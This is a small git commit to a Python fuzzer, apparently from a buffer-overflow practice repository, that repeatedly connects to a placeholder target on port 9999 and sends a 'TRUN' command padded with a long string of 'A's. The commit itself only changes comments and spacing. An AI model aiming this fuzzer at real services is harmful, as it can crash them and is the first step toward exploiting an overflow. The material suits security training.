c342ec0c61b982af5fdc46074f8ff518fcc70db2
Josh Giddings <75488156+giddings32@users.noreply.github.com>
2022-08-07 10:42:51 -0400

    Update Fuzzer.py

--- Buffer_Overflow/Remote_Buffer_Overflow/Fuzzer.py
+++ Buffer_Overflow/Remote_Buffer_Overflow/Fuzzer.py
@@ -2,14 +2,15 @@
 import sys, socket
 from time import sleep
 
-# Change IP and Port on line 12 to Target and Port Application is running on
+# Change IP and Port on line 13 to Target and Port Application is running on
+# Change TRUN on line 15 to Command you are testing
 
 buffer = "A" * 100
 
 while True:
         try:
               s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-              s.connect(('x.x.x.x',9999))
+              s.connect(('x.x.x.x', 9999))
           
               s.send(('TRUN /.:/' + buffer))
               s.close()
